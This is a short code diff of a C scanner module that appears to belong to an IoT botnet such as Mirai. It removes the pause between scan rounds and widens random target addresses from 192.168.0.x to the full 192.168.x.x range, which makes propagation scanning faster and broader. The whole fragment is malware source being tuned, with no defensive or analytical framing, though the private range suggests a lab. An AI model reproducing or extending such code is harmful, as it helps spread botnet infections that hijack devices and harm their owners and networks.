@@ -187,13 +187,13 @@ void scanner_init(void)
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
     //scaning in every isWaiting sec
-    int isWaiting = 1;
+    //int isWaiting = 1;
     // Main logic loop
     while (TRUE)
     {
-        printf("[is own programming:scanner]sleep in %d sec\n",isWaiting);
-        sleep(isWaiting);
-        printf("[is own programming:scanner]start scannig\n");
+        // printf("[is own programming:scanner]sleep in %d sec\n",isWaiting);
+        // sleep(isWaiting);
+        // printf("[is own programming:scanner]start scannig\n");
         
         fd_set fdset_rd, fdset_wr;
         struct scanner_connection *conn;
@@ -687,8 +687,10 @@ static ipv4_t get_random_ip(void)
 
         o1 = 192;
         o2 = 168;
-        o3 = 0;
-        //o3 = (tmp >> 16) & 0xff;
+	//o1 =  tmp        & 0xff;
+	//o2 = (tmp >> 8)  & 0xff;
+        //o3 = 0;
+        o3 = (tmp >> 16) & 0xff;
         o4 = (tmp >> 24) & 0xff;
     }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
